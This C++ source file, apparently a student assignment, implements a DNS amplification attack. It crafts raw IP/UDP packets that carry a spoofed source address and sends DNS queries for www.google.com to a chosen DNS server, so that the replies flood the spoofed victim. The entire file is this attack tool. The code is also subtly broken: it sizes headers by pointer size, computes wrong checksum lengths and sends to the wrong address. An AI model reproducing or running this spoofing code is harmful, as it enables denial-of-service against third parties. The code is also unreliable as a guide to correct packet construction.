#include "dnsamp.h"

void PrintError(string error){
	cerr<<error<<endl;
	exit(-1);
}

void CreateDnsHeader(dh *dns){
	// QUERY_ID uses the last 16 bits of my student id, which is defined in dnsamp.h
	dns->query_id = (unsigned short) htons(QUERY_ID);
	dns->addrr = 0;
	dns->anscount = 0;
	dns->authrr = 0;
	dns->flags = htons(FLAG_Q);
	dns->qcount = htons(1);
}

void CreateQueryInfo(query *q){
	q->dnsq_class = htons(1);
	q->dnsq_type = htons(1);
}

unsigned int CheckSum(int size, unsigned short *ptr){
	unsigned int cksum;
	for(cksum = 0; size > 1; size -= 2){
		cksum += *ptr++;
	}
	if(size == 1){
		cksum += *(unsigned short *)ptr;
	}
	return cksum;
}

// Calculate UDP checksum
unsigned short CheckUdpSum(int length, unsigned short *ptr){
	ih *ipheader = (ih *)ptr;
	uh *udpheader = (uh *)(ptr + sizeof(ipheader));
	udpheader->check = 0;
	unsigned long sum = 0;

	sum = CheckSum(8, (unsigned short *)ipheader->saddr);
	sum += CheckSum(length, (unsigned short *)udpheader);
	sum += ntohs(length + IPPROTO_UDP);

	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);

	return (unsigned short)~sum;

}

unsigned short CheckIpSum(int size, unsigned short *ptr){
	unsigned long cksum;
	for(cksum = 0; size > 0; size--){
		cksum += *ptr++;
	}

	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum = cksum + (cksum >> 16);

	return (unsigned short)~cksum;
}

void SendDnsPacket(string dnsip, string spoofip, int port){
	int sd;
	char buf[PACKET_LENGTH];
	memset(buf, 0, PACKET_LENGTH);
	struct sockaddr_in sin, din;

	ih *ipheader = (ih *)buf;
	uh *udpheader = (uh *)(buf + sizeof(ipheader));
	dh *dnsheader = (dh *)(buf + sizeof(udpheader) + sizeof(ipheader));
	char *data = buf + sizeof(udpheader) + sizeof(ipheader) + sizeof(dnsheader);

	CreateDnsHeader(dnsheader);

	strcpy(data,"\3www\6google\3com");
	int length = strlen(data) + 1;
	query *Query = (query *)(data + length);	
	CreateQueryInfo(Query);

	sin.sin_family = AF_INET;
	din.sin_family = AF_INET;
	sin.sin_port = htons(port);
	din.sin_port = htons(53);
	sin.sin_addr.s_addr = inet_addr(spoofip.c_str());
	din.sin_addr.s_addr = inet_addr(dnsip.c_str());

	ipheader->ihl = 5;
	ipheader->version = 4;
	ipheader->tos = 0;
	ipheader->tot_len = htons(sizeof(ipheader) + sizeof(udpheader) + sizeof(dnsheader) + sizeof(Query) + length);
	ipheader->id = htons(QUERY_ID);
	ipheader->ttl = 64;
	ipheader->protocol = IPPROTO_UDP;
	ipheader->saddr = inet_addr(spoofip.c_str());
	ipheader->daddr = inet_addr(dnsip.c_str());
	ipheader->check = 0;
	ipheader->check = CheckIpSum(ipheader->tot_len, (unsigned short *)buf);

	udpheader->source = htons(port);
	udpheader->dest = htons(53);
	udpheader->len = htons(sizeof(udpheader) + sizeof(dnsheader) + sizeof(Query) + length);
	udpheader->check = 0;
	udpheader->check = CheckUdpSum(udpheader->len, (unsigned short *)buf);

	sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
	if(sd < 0){
		PrintError("socket error");
	}
	else{
		sendto(sd, buf, ipheader->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
	}
	close(sd);
	return;

}